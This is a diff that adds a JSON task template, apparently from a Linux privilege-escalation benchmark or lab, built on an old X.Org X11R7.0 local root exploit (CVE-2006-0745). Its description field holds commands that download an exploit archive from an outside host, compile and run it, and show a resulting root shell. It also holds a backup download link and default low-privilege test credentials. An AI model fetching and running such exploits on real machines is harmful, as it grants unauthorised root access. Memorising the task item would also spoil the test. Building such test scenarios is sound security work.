@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_1596",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: X.Org X11 (X11R6.9.0/X11R7.0) - Local Privilege Escalation (OSVDB-24000;CVE-2006-0745)\n\nExploit source code (1596.txt):\n```\n# From Daniel Stone's Advisory\n# xorg-server 1.0.0, as shipped with X11R7.0, and all release candidates\n# of X11R7.0, is vulnerable.\n# X11R6.9.0, and all release candidates, are vulnerable.\n# X11R6.8.2 and earlier versions are not vulnerable.\n\n# The rest is H D Moore from metasploit\n\nTwo second exploit, but if anyone is lazy:\n\n$ wget http://metasploit.com/users/hdm/tools/xmodulepath.tgz\n$ tar -zpxvf xmodulepath.tgz\n$ cd xmodulepath\n$ ./root.sh\n/bin/rm -f   exploit.o exploit.so shell *.o *.so\ngcc -fPIC -c exploit.c\ngcc -shared -nostdlib exploit.o -o exploit.so\ngcc -o shell shell.c\n\nX Window System Version 7.0.0\nRelease Date: 21 December 2005\nX Protocol Version 11, Revision 0, Release 7.0\n[ snip ]\nr00t # id\nuid=0(root) gid=100(users) groups=10(wheel),18(audio)...\n\n# backup: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/1596.tgz (xmodulepath.tgz)\n\n# milw0rm.com [2006-03-20]\n```",
+  "cve": "OSVDB-24000;CVE-2006-0745",
+  "exploitdb_id": "1596",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_1596",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
